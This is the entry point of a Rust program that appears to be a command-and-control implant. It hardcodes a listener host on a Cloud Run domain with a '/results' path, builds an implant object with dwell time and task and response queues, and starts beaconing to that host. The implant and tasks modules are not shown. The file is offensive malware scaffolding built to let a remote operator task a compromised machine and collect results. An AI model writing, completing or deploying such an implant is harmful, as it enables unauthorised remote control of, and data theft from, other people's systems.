use tokio::time::Duration;
mod implant;
mod tasks;
#[tokio::main]
async fn main() {
    //http://listener-4uerpljfuq-og.a.run.app
    let host = String::from("listener-4uerpljfuq-og.a.run.app");
    let port = String::from("");
    let uri = String::from("/results");

    let mut implant = implant::Implant {
        host,
        port,
        uri,
        dwell: 1.0,
        is_running: true,
        tasks: Vec::new(),
        responses: Vec::new(),
    };

    implant.beacon().await;
}
